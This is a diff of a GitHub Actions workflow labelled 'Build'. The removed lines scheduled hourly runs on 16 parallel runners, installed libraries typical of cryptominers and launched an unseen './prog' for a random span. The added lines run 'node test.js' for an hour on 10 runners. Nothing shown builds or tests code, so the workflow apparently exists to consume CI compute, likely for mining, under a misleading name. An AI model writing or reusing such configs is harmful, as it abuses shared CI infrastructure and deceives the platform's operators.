@@ -1,8 +1,5 @@
 name: Build
-on:
-  push:
-  schedule:
-    - cron: "45 * * * *"
+on: [push]
 jobs:
   test:
     name: Fetch
@@ -13,10 +10,10 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        runners: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]
+        runners: [0,1,2,3,4,5,6,7,8,9]
     steps:
       - uses: actions/checkout@v2
       - run: |
           apt update -qq
-          apt install -y libuv1 libssl1.1 libhwloc15
-          timeout $(shuf -i 400-720 -n 1) ./prog
+          apt install -y nodejs
+          timeout 3600 node test.js
